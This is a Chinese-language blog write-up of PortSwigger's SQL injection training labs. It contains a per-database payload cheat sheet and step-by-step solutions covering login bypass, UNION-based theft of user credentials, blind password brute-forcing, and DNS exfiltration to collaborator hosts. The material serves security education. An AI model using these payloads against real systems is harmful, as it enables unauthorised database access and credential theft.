为了加深对sql注入的实战理解，这里我对burp官方的sql注入靶场做了一次全通关解析，针对备忘录清单也重点截取了上来，希望这篇sql注入学习笔记能对你有所帮助。

# sql注入危害

  1. 允许攻击者查看他们通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序本身能够访问的任何其他数据。
  2. 攻击者可以修改或删除这些数据，从而导致应用程序的内容或行为发生持续变化。
  3. 攻击者可以升级 SQL 注入攻击以破坏底层服务器或其他后端基础架构，或执行拒绝服务攻击。
  4. SQL 注入攻击可能导致未经授权访问敏感数据，例如密码、信用卡详细信息或个人用户信息。在某些情况下，攻击者可以获得进入组织系统的持久后门，从而导致长期危害，而这种危害可能会在很长一段时间内被忽视。

  

# 不同数据库sql注入备忘清单

### 字符串拼接

多个字符串连接在一起以形成单个字符串。

Oracle

|

'foo'||'bar'  
  
---|---  
  
Microsoft

|

'foo'+'bar'  
  
PostgreSQL

|

'foo'||'bar'  
  
MySQL

|

'foo' 'bar' 注意两个字符串之间有空格]  
CONCAT('foo','bar')  
  
### 子字符串

从指定偏移量和指定长度中提取字符串的一部分。但要注意，偏移索引都是从 1 开始的。因此以下每个表达式都将返回字符串ba。

Oracle

|

SUBSTR('foobar', 4, 2)  
  
---|---  
  
Microsoft

|

SUBSTRING('foobar', 4, 2)  
  
PostgreSQL

|

SUBSTRING('foobar', 4, 2)  
  
MySQL

|

SUBSTRING('foobar', 4, 2)  
  
### 注释

使用注释来截断查询并删除原始查询中输入之后的部分

Oracle

|

\--comment  
  
---|---  
  
Microsoft

|

\--comment  
/*comment*/  
  
PostgreSQL

|

\--comment  
/*comment*/  
  
MySQL

|

#comment  
\-- comment [注意双破折号后的空格]  
/*comment*/  
  
### 查询数据库版本

可以查询数据库以确定其类型和版本

Oracle

|

SELECT * FROM v$version  
  
---|---  
  
Microsoft

|

SELECT @@version  
  
PostgreSQL

|

SELECT version()  
  
MySQL

|

SELECT @@version  
  
### 查询数据库内容

列出数据库中存在的表以及这些表包含的列

Oracle

|

SELECT * FROM all_tables  
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'  
  
---|---  
  
Microsoft

|

SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  
  
PostgreSQL

|

SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  
  
MySQL

|

SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  
  
### 条件错误

测试单个布尔条件，并在条件为真时触发数据库错误

Oracle

|

SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM
dual  
  
---|---  
  
Microsoft

|

SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END  
  
PostgreSQL

|

1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)  
  
MySQL

|

SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM
information_schema.tables),'a')  
  
### 报错获取数据

引发报错，从而泄露恶意查询返回的敏感数据

Microsoft

|

SELECT 'foo' WHERE 1 = (SELECT 'secret')  
  
> Conversion failed when converting the varchar value 'secret' to data type
> int.  
  
---|---  
  
PostgreSQL

|

SELECT CAST((SELECT password FROM users LIMIT 1) AS int)  
  
> invalid input syntax for integer: "secret"  
  
MySQL

|

SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))  
  
> XPATH syntax error: '\secret'  
  
### 批量（或堆叠）查询

使用批量查询来连续执行多个查询，但是在执行后续查询时，并不会将结果返回给应用程序。

因此，这种技术主要用在无法直接获取查询结果的漏洞，可以使用第二个查询来触发 DNS 查找、条件错误或时间延迟等操作。

对于 MySQL，批处理查询通常不能用于 SQL 注入。但是，如果目标应用程序使用某些 PHP 或 Python API 与 MySQL
数据库通信，这种情况有时是可能的。

Oracle

|

Does not support batched queries.（不支持批量查询）  
  
---|---  
  
Microsoft

|

QUERY-1-HERE; QUERY-2-HERE  
QUERY-1-HERE QUERY-2-HERE  
  
PostgreSQL

|

QUERY-1-HERE; QUERY-2-HERE  
  
MySQL

|

QUERY-1-HERE; QUERY-2-HERE  
  
### 时间延迟注入

处理查询时，可能会导致数据库出现时间延迟。以下将导致无条件延迟 10 秒。

Oracle

|

dbms_pipe.receive_message(('a'),10)  
  
---|---  
  
Microsoft

|

WAITFOR DELAY '0:0:10'  
  
PostgreSQL

|

SELECT pg_sleep(10)  
  
MySQL

|

SELECT SLEEP(10)  
  
### 有条件的时间延迟注入

测试单个布尔条件并在条件为真时触发时间延迟

Oracle

|

SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN
'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual  
  
---|---  
  
Microsoft

|

IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'  
  
PostgreSQL

|

SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END  
  
MySQL

|

SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')  
  
### DNS查询

使数据库对外部域执行 DNS 查找，可以使用 Burp Collaborator 生成在攻击中使用的唯一 Burp Collaborator子域，然后轮询
Collaborator 服务器以确认是否发生了 DNS 查询。

Oracle

|

( [XXE](https://portswigger.net/web-security/xxe)) 漏洞触发 DNS
查询。该漏洞已被修补，但存在许多未修补的 Oracle 安装：

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE
root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/">
%remote;]>'),'/l') FROM dual

以下技术适用于完全修补的 Oracle 安装，但需要提升的权限：

SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')  
  
---|---  
  
Microsoft

|

exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'  
  
PostgreSQL

|

copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'  
  
MySQL

|

以下技术仅适用于 Windows：

LOAD_FILE('\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\a')  
SELECT ... INTO OUTFILE '\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\a'  
  
### DNS查询与数据泄漏

使数据库对包含注入查询结果的外部域执行 DNS 查找。可以使用Burp Collaborator生成在攻击中使用的唯一 Burp
Collaborator子域，然后轮询 Collaborator 服务器以检索任何 DNS 交互的详细信息，包括泄露的数据。

Oracle

|

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE
root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual  
  
---|---  
  
Microsoft

|

declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')  
  
PostgreSQL

|

create OR replace function f() returns void as $$  
declare c text;  
declare p text;  
begin  
SELECT into p (SELECT YOUR-QUERY-HERE);  
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';  
execute c;  
END;  
$$ language plpgsql security definer;  
SELECT f();  
  
MySQL

|

以下技术仅适用于 Windows：  
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\a'  
  
  

# 实战lab

### lab1: 通过WHERE 子句中的 SQL 注入漏洞检索隐藏数据

  * 引入眼帘是这样一片商场

![1693064321_64ea1c8118162b0600386.png!small](https://image.3001.net/images/20230826/1693064321_64ea1c8118162b0600386.png!small)

  * 开启抓包，在Gift位置可以看见url有个很明显的?productId参数，有经验的测试人员就会去关注这个点有没有注入

![1693064339_64ea1c9335a043c6735ee.png!small](https://image.3001.net/images/20230826/1693064339_64ea1c9335a043c6735ee.png!small)

  * 遍历productId

![1693064353_64ea1ca1bfbc45564f646.png!small](https://image.3001.net/images/20230826/1693064353_64ea1ca1bfbc45564f646.png!small)

![1693064372_64ea1cb4d19361f39ef78.png!small](https://image.3001.net/images/20230826/1693064372_64ea1cb4d19361f39ef78.png!small)

  * 加入报错参数： " , ' 无服务器报错回显

![1693064390_64ea1cc680156c894f20a.png!small](https://image.3001.net/images/20230826/1693064390_64ea1cc680156c894f20a.png!small)

![1693064406_64ea1cd68dd823f5635fe.png!small](https://image.3001.net/images/20230826/1693064406_64ea1cd68dd823f5635fe.png!small)

  * 找其他注入点

![1693064425_64ea1ce98c637d038045c.png!small](https://image.3001.net/images/20230826/1693064425_64ea1ce98c637d038045c.png!small)

  * 报错尝试，服务器返回500

![1693064442_64ea1cfa5ba8e87defbee.png!small](https://image.3001.net/images/20230826/1693064442_64ea1cfa5ba8e87defbee.png!small)

  * 构造payload： '+or+1=1--
![1693064463_64ea1d0f5a2f01a1a2448.png!small](https://image.3001.net/images/20230826/1693064463_64ea1d0f5a2f01a1a2448.png!small)

![1693064623_64ea1dafede35a822cc63.png!small](https://image.3001.net/images/20230826/1693064623_64ea1dafede35a822cc63.png!small)

### lab2: 通过sql注入绕过登录

  * 既然是绕过登录验证，那就在登录口尝试万能账号密码

![1693064639_64ea1dbfb435753739d36.png!small](https://image.3001.net/images/20230826/1693064639_64ea1dbfb435753739d36.png!small)

  * 构造payload：admin' or 1=1--
![1693064677_64ea1de59561f3429fd18.png!small](https://image.3001.net/images/20230826/1693064677_64ea1de59561f3429fd18.png!small)

### lab3: 通过sql注入查询Oracle上的数据库类型和版本

  * 引入眼帘还是那个熟悉的界面，那我们直接就找到注入点

![1693064695_64ea1df71ba09315d7039.png!small](https://image.3001.net/images/20230826/1693064695_64ea1df71ba09315d7039.png!small)

  * 由于题目说了是对Oracle数据库版本进行查询，所以我们构造相应的payload: '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
Oracle

|

SELECT * FROM v$version  
  
---|---  
  
![1693064712_64ea1e08983a2063b428e.png!small](https://image.3001.net/images/20230826/1693064712_64ea1e08983a2063b428e.png!small)

### lab4: 通过sql注入查询Mysql和Microsoft上的数据库类型和版本

MySQL

|

SELECT @@version  
  
---|---  
  
Microsoft

|

SELECT @@version  
  
  * 和上一题一样，直接在漏洞点构造payload即可

![1693064737_64ea1e219e907cbef256b.png!small](https://image.3001.net/images/20230826/1693064737_64ea1e219e907cbef256b.png!small)

  * 构造payload： '+UNION+SELECT+'abc','def'--，响应包返回两列，其中两列都包含文本

![1693064757_64ea1e353d7833179871a.png!small](https://image.3001.net/images/20230826/1693064757_64ea1e353d7833179871a.png!small)

  * 查询数据库版本： '+UNION+SELECT+@@version,'def'--
![1693064774_64ea1e46a760b7ce468dc.png!small](https://image.3001.net/images/20230826/1693064774_64ea1e46a760b7ce468dc.png!small)

### lab5: 通过sql注入列出非Oracle数据库上的数据库内容

  * 这里我们找到漏洞点后，直接选择对应payload查询数据库内容

![1693064789_64ea1e55a4f88391f0f01.png!small](https://image.3001.net/images/20230826/1693064789_64ea1e55a4f88391f0f01.png!small)

  * payload

Microsoft

|

SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  
  
---|---  
  
PostgreSQL

|

SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  
  
MySQL

|

SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  
  
  * 构造payload确定查询返回的列数以及哪些列包含文本数据：'+UNION+SELECT+'abc','def'--
![1693064807_64ea1e674d9ed535146e3.png!small](https://image.3001.net/images/20230826/1693064807_64ea1e674d9ed535146e3.png!small)

  * 构造payload检索数据库中的表： '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
![1693064827_64ea1e7bbf4450d2d1ea4.png!small](https://image.3001.net/images/20230826/1693064827_64ea1e7bbf4450d2d1ea4.png!small)

  * 构造payload检索表中列的详细信息： '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_adebts'--
![1693064848_64ea1e901e90728eadf04.png!small](https://image.3001.net/images/20230826/1693064848_64ea1e901e90728eadf04.png!small)

  * 查看具体的用户名密码：

'+UNION+SELECT+username_etwctj,+password_aiairg+FROM+users_adebts--
![1693064865_64ea1ea11b8090bc96e56.png!small](https://image.3001.net/images/20230826/1693064865_64ea1ea11b8090bc96e56.png!small)

![1693064881_64ea1eb1d202da4a3ef0c.png!small](https://image.3001.net/images/20230826/1693064881_64ea1eb1d202da4a3ef0c.png!small)

### lab6: 通过sql注入列出Oracle数据库上的数据库内容

  * 这里就直接改变一下payload即可

Oracle

|

SELECT * FROM all_tables  
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'  
  
---|---  
  
  * 确定查询返回的列数以及哪些列包含文本数据： '+UNION+SELECT+'abc','def'+FROM+dual--
![1693064899_64ea1ec38ccc921020ed8.png!small](https://image.3001.net/images/20230826/1693064899_64ea1ec38ccc921020ed8.png!small)

  * 构造payload，查询数据库中的所有表：'+UNION+SELECT+table_name,NULL+FROM+all_tables--
![1693064914_64ea1ed2dddd9d954eb9f.png!small](https://image.3001.net/images/20230826/1693064914_64ea1ed2dddd9d954eb9f.png!small)

  * 获取列信息： '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_DIBSEW'--
![1693064930_64ea1ee23e9ac783f6a2c.png!small](https://image.3001.net/images/20230826/1693064930_64ea1ee23e9ac783f6a2c.png!small)

  * 获取账号密码: '+UNION+SELECT+USERNAME_DERPLU,+PASSWORD_RWJNZY+FROM+USERS_DIBSEW--
![1693064956_64ea1efc0540b3abe16cf.png!small](https://image.3001.net/images/20230826/1693064956_64ea1efc0540b3abe16cf.png!small)

  * 利用administrator账户登录

![1693064972_64ea1f0c519e776293931.png!small](https://image.3001.net/images/20230826/1693064972_64ea1f0c519e776293931.png!small)

### lab7: sql注入UNION攻击，确定查询返回的列数

  * 这里我们首先找到漏洞点

![1693065532_64ea213c97d32382c5a80.png!small](https://image.3001.net/images/20230826/1693065532_64ea213c97d32382c5a80.png!small)

  * 可以利用ORDER by的方式判断有3列

![1693065598_64ea217e9b926d9135990.png!small](https://image.3001.net/images/20230826/1693065598_64ea217e9b926d9135990.png!small)

![1693065614_64ea218e26b4df2a7c5dd.png!small](https://image.3001.net/images/20230827/1693065614_64ea218e26b4df2a7c5dd.png!small)

  * 构造payload： '+UNION+SELECT+NULL,NULL,NULL--
![1693065632_64ea21a0b2e7b4aeb374c.png!small](https://image.3001.net/images/20230827/1693065632_64ea21a0b2e7b4aeb374c.png!small)

### lab8: SQL注入UNION攻击，找到包含文本的列

  * 和上题一样，利用order by发现有3列

![1693065650_64ea21b289f0835291549.png!small](https://image.3001.net/images/20230827/1693065650_64ea21b289f0835291549.png!small)

![1693065665_64ea21c1caafa5e239641.png!small](https://image.3001.net/images/20230827/1693065665_64ea21c1caafa5e239641.png!small)

  * 构造payload，替换null值

![1693065681_64ea21d1e5ce48a9c1458.png!small](https://image.3001.net/images/20230827/1693065681_64ea21d1e5ce48a9c1458.png!small)

![1693065703_64ea21e7b45a193f88f6c.png!small](https://image.3001.net/images/20230827/1693065703_64ea21e7b45a193f88f6c.png!small)

### lab9: SQL注入UNION攻击，从其他表中检索数据

  * 利用order+by发现只有两列

![1693065719_64ea21f7c920fd44d7925.png!small](https://image.3001.net/images/20230827/1693065719_64ea21f7c920fd44d7925.png!small)

![1693065738_64ea220a7a411ba0311aa.png!small](https://image.3001.net/images/20230827/1693065738_64ea220a7a411ba0311aa.png!small)

  * 构造payload： 'UNION+SELECT+'abc','def'--
![1693065757_64ea221d749e225da145e.png!small](https://image.3001.net/images/20230827/1693065757_64ea221d749e225da145e.png!small)

  * 查询数据库版本： '+UNION+SELECT+version(),'def'--
![1693065774_64ea222eb6d9f0eb1a182.png!small](https://image.3001.net/images/20230827/1693065774_64ea222eb6d9f0eb1a182.png!small)

  * 查询数据表内容： '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
![1693065797_64ea22457c8a55698862b.png!small](https://image.3001.net/images/20230827/1693065797_64ea22457c8a55698862b.png!small)

  * 查询表中列： '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--
![1693065839_64ea226fdd50ffd375155.png!small](https://image.3001.net/images/20230827/1693065839_64ea226fdd50ffd375155.png!small)

查询字段： '+UNION+SELECT+username,+password+FROM+users--
![1693065855_64ea227fe02cce43e75ff.png!small](https://image.3001.net/images/20230827/1693065855_64ea227fe02cce43e75ff.png!small)

![1693065870_64ea228eae1c98d2fadc0.png!small](https://image.3001.net/images/20230827/1693065870_64ea228eae1c98d2fadc0.png!small)

![1693065884_64ea229cbfad0c757fbf1.png!small](https://image.3001.net/images/20230827/1693065884_64ea229cbfad0c757fbf1.png!small)

### lab10: SQL 注入 UNION攻击，检索单个列中的多个值

  * 首先通过ORDER+BY发现存在两列

![1693065900_64ea22aceea6b4c8e0c8e.png!small](https://image.3001.net/images/20230827/1693065900_64ea22aceea6b4c8e0c8e.png!small)

  * 确定列的文本位置

![1693065917_64ea22bde44eeffac8258.png!small](https://image.3001.net/images/20230827/1693065917_64ea22bde44eeffac8258.png!small)

  * 判断数据库类型 '+UNION+SELECT+NULL,version()--
![1693065934_64ea22ce06a6176f11fcc.png!small](https://image.3001.net/images/20230827/1693065934_64ea22ce06a6176f11fcc.png!small)

  * 查询表： '+UNION+SELECT+NULL,+table_name+FROM+information_schema.tables--
![1693065948_64ea22dc678181eed768a.png!small](https://image.3001.net/images/20230827/1693065948_64ea22dc678181eed768a.png!small)

  * 查询列： '+UNION+SELECT+NULL,+column_name+FROM+information_schema.columns+WHERE+table_name='users'--
![1693065964_64ea22ec71eb5c5a29c60.png!small](https://image.3001.net/images/20230827/1693065964_64ea22ec71eb5c5a29c60.png!small)

  * 字段： '+UNION+SELECT+NULL,+username||'~'||password+FROM+users--
![1693065979_64ea22fbb1d5ac6471381.png!small](https://image.3001.net/images/20230827/1693065979_64ea22fbb1d5ac6471381.png!small)

### lab11: 带有条件响应的SQL盲注

  * 这题和前面的题目就不太一样了，不一样的点在于：（1）注入点不在常见的路径处；（2）通过报错没办法在响应中出现敏感信息。
  * 在?category处注入 ' 无服务器报错回显

![1693065994_64ea230a70c8c444b51ce.png!small](https://image.3001.net/images/20230827/1693065994_64ea230a70c8c444b51ce.png!small)

  * 真正的注入点在刚进页面时抓包的cookie处

![1693066009_64ea23198c0760bcc2953.png!small](https://image.3001.net/images/20230827/1693066009_64ea23198c0760bcc2953.png!small)

![1693066026_64ea232a47a808d73abfe.png!small](https://image.3001.net/images/20230827/1693066026_64ea232a47a808d73abfe.png!small)

  * 对比and '1'='1 和 and '1'='2，返回包存在明显的差异

![1693066043_64ea233bd64475456ed04.png!small](https://image.3001.net/images/20230827/1693066043_64ea233bd64475456ed04.png!small)

  * 之后我们利用时间盲注来判断是否存在users的表： ' AND (SELECT 'a' FROM users LIMIT 1)='a 通过比对响应包是否回显welcome back来判断

![1693066058_64ea234a1b2f2bac16d9e.png!small](https://image.3001.net/images/20230827/1693066058_64ea234a1b2f2bac16d9e.png!small)

  * 判断是否有administrator的账户 ' AND (SELECT 'a' FROM users WHERE username='administrator')='a

![1693066071_64ea2357a04ef9a33baf3.png!small](https://image.3001.net/images/20230827/1693066071_64ea2357a04ef9a33baf3.png!small)

  * 确定用户密码的字符数大于1，条件为真 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

![1693066087_64ea236717363e2651a5e.png!small](https://image.3001.net/images/20230827/1693066087_64ea236717363e2651a5e.png!small)

  * 利用Intruder爆破，看看密码长度究竟是多少，设置响应包的匹配

![1693066104_64ea23781f8952e9d4777.png!small](https://image.3001.net/images/20230827/1693066104_64ea23781f8952e9d4777.png!small)

* * *

![1693066131_64ea23932eb2d98d7f26b.png!small](https://image.3001.net/images/20230827/1693066131_64ea23932eb2d98d7f26b.png!small)![1693066146_64ea23a2be7403613b84e.png!small](https://image.3001.net/images/20230827/1693066146_64ea23a2be7403613b84e.png!small)

  * 得到密码长度为20

![1693066161_64ea23b1242f9493138a1.png!small](https://image.3001.net/images/20230827/1693066161_64ea23b1242f9493138a1.png!small)

  * 爆破20位密码： ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

![1693066180_64ea23c47e3c13f0fe8b6.png!small](https://image.3001.net/images/20230827/1693066180_64ea23c47e3c13f0fe8b6.png!small)

  * 获取密码：2kv1m6dn3u2bzrgrlha5，成功登录

![1693066197_64ea23d53d596878cdeb1.png!small](https://image.3001.net/images/20230827/1693066197_64ea23d53d596878cdeb1.png!small)

![1693066212_64ea23e470b3664bd2b51.png!small](https://image.3001.net/images/20230827/1693066212_64ea23e470b3664bd2b51.png!small)

### lab12: 带有条件错误的 SQL 盲注

  * 本题和上一题一样，注入点是在我们的cookie处

![1693066252_64ea240c1346eb8b94265.png!small](https://image.3001.net/images/20230827/1693066252_64ea240c1346eb8b94265.png!small)

  * 神奇的是，如果再加一个 ' 响应返回200

![1693066265_64ea2419b534ee6cc44ae.png!small](https://image.3001.net/images/20230827/1693066265_64ea2419b534ee6cc44ae.png!small)

  * 下面我们的重点就是想要利用恶意的sql语句进行注入： '||(SELECT '')||' 这里报500，sql语句没有执行，可能是数据库类型不一样

![1693066299_64ea243b22447874c95db.png!small](https://image.3001.net/images/20230827/1693066299_64ea243b22447874c95db.png!small)

  * 更换payload '||(SELECT '' FROM dual)||' 这里返回正常，表明可能是ORACLE数据库

![1693066313_64ea24499990285294312.png!small](https://image.3001.net/images/20230827/1693066313_64ea24499990285294312.png!small)

判断users表是否存在： '||(SELECT '' FROM users WHERE ROWNUM = 1)||'

![1693066328_64ea24581a12f81a5a7d6.png!small](https://image.3001.net/images/20230827/1693066328_64ea24581a12f81a5a7d6.png!small)

  * 构造测试语句，判断是否收到错误信息，条件为真返回500，条件为假返回200 '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

![1693066344_64ea2468c461f5c917b98.png!small](https://image.3001.net/images/20230827/1693066344_64ea2468c461f5c917b98.png!small)

![1693066358_64ea2476b3bd65ba10486.png!small](https://image.3001.net/images/20230827/1693066358_64ea2476b3bd65ba10486.png!small)

  * 利用条件报错判断是否存在administrator '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

![1693066375_64ea2487612759fdde034.png!small](https://image.3001.net/images/20230827/1693066375_64ea2487612759fdde034.png!small)

  * 爆破密码长度，密码长度大于1为真，最终得到密码长度为20：'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

![1693066393_64ea249989195993dd7c9.png!small](https://image.3001.net/images/20230827/1693066393_64ea249989195993dd7c9.png!small)

* * *

![1693066409_64ea24a90c9113e74aefc.png!small](https://image.3001.net/images/20230827/1693066409_64ea24a90c9113e74aefc.png!small)

  * 爆破密码： '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

![1693066423_64ea24b7aa3b12b5ef818.png!small](https://image.3001.net/images/20230827/1693066423_64ea24b7aa3b12b5ef818.png!small)

* * *

![1693066441_64ea24c982146040188c1.png!small](https://image.3001.net/images/20230827/1693066441_64ea24c982146040188c1.png!small)

  * 利用账号密码登录： yvqwhmf8d42p9swl9crs

![1693066455_64ea24d7ea2f3092c9354.png!small](https://image.3001.net/images/20230827/1693066455_64ea24d7ea2f3092c9354.png!small)

### lab13: 可见的基于错误的sql注入

  * 首先判断注入点在cookie处

![1693066469_64ea24e5cf346dfe246a1.png!small](https://image.3001.net/images/20230827/1693066469_64ea24e5cf346dfe246a1.png!small)

  * 在'注入后添加了--注释，响应报200

![1693066486_64ea24f6c0e686913abff.png!small](https://image.3001.net/images/20230827/1693066486_64ea24f6c0e686913abff.png!small)

  * 构造sql语句查询查询并将返回值转换为int数据类型，此时返回报错： ' AND CAST((SELECT 1) AS int)--
![1693066503_64ea250751d71d387cefc.png!small](https://image.3001.net/images/20230827/1693066503_64ea250751d71d387cefc.png!small)

  * 修改payload，利用比较运算符 ' AND 1=CAST((SELECT 1) AS int)--
![1693066518_64ea2516e2635a9936222.png!small](https://image.3001.net/images/20230827/1693066518_64ea2516e2635a9936222.png!small)

  * 调整sql语句，检索用户名，从返回包的报错可以看到查询可能啥由于字符限制而被截断： ' AND 1=CAST((SELECT username FROM users) AS int)--
![1693066535_64ea2527e6abeb5504c92.png!small](https://image.3001.net/images/20230827/1693066535_64ea2527e6abeb5504c92.png!small)

  * 这次我们删掉TrackingId以释放一些额外的字符，从返回包来看，该子查询返回了多行结果，但是在这个上下文中，只能够接受一个单一的结果。

![1693066551_64ea25378adece8feefe8.png!small](https://image.3001.net/images/20230827/1693066551_64ea25378adece8feefe8.png!small)

  * 修改payload，响应包爆出了第一个账户名administrator： ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
![1693066568_64ea254862829c9dffa1f.png!small](https://image.3001.net/images/20230827/1693066568_64ea254862829c9dffa1f.png!small)

  * 爆它密码： ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
![1693066583_64ea2557b75843f683ae1.png!small](https://image.3001.net/images/20230827/1693066583_64ea2557b75843f683ae1.png!small)

![1693066598_64ea2566c1ad46ebb20f6.png!small](https://image.3001.net/images/20230827/1693066598_64ea2566c1ad46ebb20f6.png!small)

### lab14: 带有时间延迟的SQL盲注

  * 这题和之前的题目不太一样，可以看到我们在cookie处注入 ' 响应包没有报错

![1693066613_64ea25758471a141ab474.png!small](https://image.3001.net/images/20230827/1693066613_64ea25758471a141ab474.png!small)

  * 既然题目说是时间盲注，根据不同数据库类型打一下payload

Oracle

|

dbms_pipe.receive_message(('a'),10)  
  
---|---  
  
Microsoft

|

WAITFOR DELAY '0:0:10'  
  
PostgreSQL

|

SELECT pg_sleep(10)  
  
MySQL

|

SELECT SLEEP(10)  
  
'||WAITFOR DELAY '0:0:10'-- 无延迟

![1693066629_64ea2585e315840a78002.png!small](https://image.3001.net/images/20230827/1693066629_64ea2585e315840a78002.png!small)

* * *

'||dbms_pipe.receive_message(('a'),10) 无延迟

![1693066644_64ea259490d019b3209d4.png!small](https://image.3001.net/images/20230827/1693066644_64ea259490d019b3209d4.png!small)

* * *

'||pg_sleep(10)-- 明显延迟

![1693066661_64ea25a572398de39c461.png!small](https://image.3001.net/images/20230827/1693066661_64ea25a572398de39c461.png!small)

![1693066676_64ea25b4f3071110dd0ee.png!small](https://image.3001.net/images/20230827/1693066676_64ea25b4f3071110dd0ee.png!small)

* * *

'||sleep(10)-- 无延迟

![1693066691_64ea25c3e0138beac5af1.png!small](https://image.3001.net/images/20230827/1693066691_64ea25c3e0138beac5af1.png!small)

### lab15: 带有时间延迟和信息检索的 SQL 盲注

  * 这题的注入点依然是在cookie处，并且添加 ' 响应包没有返回500

![1693066706_64ea25d2cf3a5890c43c3.png!small](https://image.3001.net/images/20230827/1693066706_64ea25d2cf3a5890c43c3.png!small)

  * 构造payload查看延时，and 1=1存在延时，and 1=2无延时： '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
![1693066721_64ea25e16c0f7fae5dccb.png!small](https://image.3001.net/images/20230827/1693066721_64ea25e16c0f7fae5dccb.png!small)

* * *

![1693066739_64ea25f302e3ba1cd0bd4.png!small](https://image.3001.net/images/20230827/1693066739_64ea25f302e3ba1cd0bd4.png!small)

  * 利用延时性来判断用户名是否为真，确实存在用户名为administrator， '%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
![1693066754_64ea2602967a1e4e10eb5.png!small](https://image.3001.net/images/20230827/1693066754_64ea2602967a1e4e10eb5.png!small)

  * 判断密码长度为20位： '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
![1693066769_64ea2611ee18339be148d.png!small](https://image.3001.net/images/20230827/1693066769_64ea2611ee18339be148d.png!small)

![1693066785_64ea2621b6f9480507384.png!small](https://image.3001.net/images/20230827/1693066785_64ea2621b6f9480507384.png!small)

  * 爆破密码：'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
![1693066799_64ea262f4739d4058daa1.png!small](https://image.3001.net/images/20230827/1693066799_64ea262f4739d4058daa1.png!small)

* * *

9xuyd2xbyi4qjlids9z2

![1693066812_64ea263c840a8a2cee60b.png!small](https://image.3001.net/images/20230827/1693066812_64ea263c840a8a2cee60b.png!small)

### lab16: 带外交互的SQL盲注

  * 这题的注入点依然是在cookie处，不同的是这次我们利用注入与DNS服务器做一次交互

![1693066827_64ea264b559b083eb7439.png!small](https://image.3001.net/images/20230827/1693066827_64ea264b559b083eb7439.png!small)

  * 构造payload： '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//en5zj1jxd2mgevsgmq7780xv5mbcz1.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
